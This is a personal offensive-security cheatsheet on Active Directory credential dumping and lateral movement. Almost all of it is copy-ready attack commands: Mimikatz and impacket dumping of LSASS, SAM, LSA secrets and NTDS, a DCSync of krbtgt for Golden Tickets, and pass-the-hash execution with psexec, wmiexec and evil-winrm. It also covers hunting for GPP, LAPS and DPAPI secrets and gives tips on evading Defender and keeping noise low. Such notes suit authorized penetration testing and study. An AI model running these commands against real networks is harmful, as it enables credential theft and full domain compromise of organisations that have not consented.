---
tags: [hacking, active-directory, windows, lateral-movement, credentials]
type: cheatsheet
source: personal Notion — "Active Directory" cheatsheet + additions
last-verified: 2026-09-03
---

# Lateral Movement & Credential Access

## Up
- [[Active Directory]]

Harvest credentials and move host-to-host. The engine of an AD engagement: dump → reuse → move → dump again.

---

## Credential Dumping (Mimikatz)
Windows stores creds in **LSASS** (NTLM, Kerberos tickets, sometimes plaintext via WDigest), **SAM** (local hashes), **LSA secrets** (service acct passwords), and Credential Manager.

```powershell
mimikatz # privilege::debug
sekurlsa::logonpasswords      # everything in LSASS (hashes + tickets + WDigest)
sekurlsa::msv                 # NTLM hashes only
sekurlsa::ekeys               # Kerberos AES keys (for overpass-the-hash)
sekurlsa::tickets /export     # dump tickets (.kirbi) → [[Kerberos Attacks]] PtT
lsadump::sam                  # local SAM hashes
lsadump::secrets              # LSA secrets (service creds)
lsadump::cache                # cached domain logons (crack: hashcat -m 2100)
```
Defender-friendly alternatives to touch LSASS: `procdump -ma lsass.exe lsass.dmp` then offline `pypykatz lsa minidump lsass.dmp`, or a comsvcs.dll minidump.

## Credential Dumping (Impacket / Linux)
```bash
impacket-secretsdump corp.local/user:pass@<target>          # SAM + LSA + cached
impacket-secretsdump corp.local/user@<target> -hashes :<ntlm>
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL   # offline from NTDS.dit
nxc smb <target> -u user -p pass --sam --lsa                 # NetExec
```
Output: `user:RID:LM:NTLM:::` → crack ([[Password Cracking]]) or **pass** directly.

## DCSync (dump domain hashes without touching the DC's disk)
Needs **GetChanges + GetChangesAll** (Domain/Enterprise Admins, or granted via [[ACL & GPO Abuse]]).
```powershell
mimikatz # lsadump::dcsync /user:krbtgt          # krbtgt → Golden Ticket
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```
```bash
impacket-secretsdump -just-dc corp.local/DA:pass@<dc>            # all domain hashes
impacket-secretsdump -just-dc-user krbtgt corp.local/DA@<dc> -hashes :<ntlm>
```
**Detect:** Event **4662** (replication GUID `1131f6aa-…`) from a non-DC source.

---

## Reuse: Pass-the-Hash / Pass-the-Ticket / Overpass
```bash
# Pass-the-Hash (NTLM as password)
impacket-psexec corp.local/user@<target> -hashes :<ntlm>      # → SYSTEM (noisy)
impacket-wmiexec corp.local/user@<target> -hashes :<ntlm>     # quieter, no service
impacket-smbexec / impacket-atexec ...                        # more exec methods
nxc smb <target> -u user -H <ntlm> -x whoami                  # (Pwn3d! = local admin)
evil-winrm -i <target> -u user -H <ntlm>                      # WinRM shell (see [[WinRM (5985,5986)]])
```
Pass-the-Ticket & Overpass-the-Hash → [[Kerberos Attacks]] (use `-k -no-pass`, or `getTGT` from a hash).

## Exec-method quick guide
| Tool | Mechanism | Notes |
|---|---|---|
| `psexec` | SMB + service | Reliable, → SYSTEM, **noisy** (creates service) |
| `wmiexec` | WMI (135) | Semi-interactive, quieter |
| `smbexec` | SMB + service | Similar to psexec |
| `atexec` | Scheduled task | One-shot command |
| `dcomexec` | DCOM | Alternative to WMI |
| `evil-winrm` | WinRM (5985) | Best interactive shell; PtH support |
| `winrs` / `wmiexec -k` | Kerberos | Ticket-based, stealthier |
| RDP (3389) | GUI | `xfreerdp /pth:` for restricted-admin PtH |

---

## Other credential sources (loot)
```bash
# GPP passwords in SYSVOL (cpassword — AES key is public)
nxc smb <dc> -u user -p pass -M gpp_password
Get-GPPPassword ; gpp-decrypt <cpassword>
# LAPS (local admin passwords in AD, if you can read the attr)
nxc ldap <dc> -u user -p pass -M laps
Get-LAPSPasswords / Get-DomainObject -Properties ms-Mcs-AdmPwd
# DPAPI (browser/cred-manager secrets) — needs the masterkey
impacket-dpapi / mimikatz dpapi::  •  SharpDPAPI
# hunt files/shares for creds
nxc smb <range> -u user -p pass -M spider_plus
```
Also: `cmdkey /list`, unattend.xml/sysprep.xml, PowerShell history, KeePass DBs, config files.

---

## Takeaways
- **Dump → reuse everywhere → move → dump again.** Prefer **PtH/PtT** over cracking.
- **DCSync krbtgt** is the pivot from Domain Admin to permanent control (Golden Ticket, [[Trusts & Persistence]]).
- `wmiexec`/`evil-winrm`/Kerberos exec are quieter than `psexec`; mind the noise.
- **GPP/LAPS/DPAPI** and share-spidering are where "extra" creds hide — check them before assuming you're stuck.
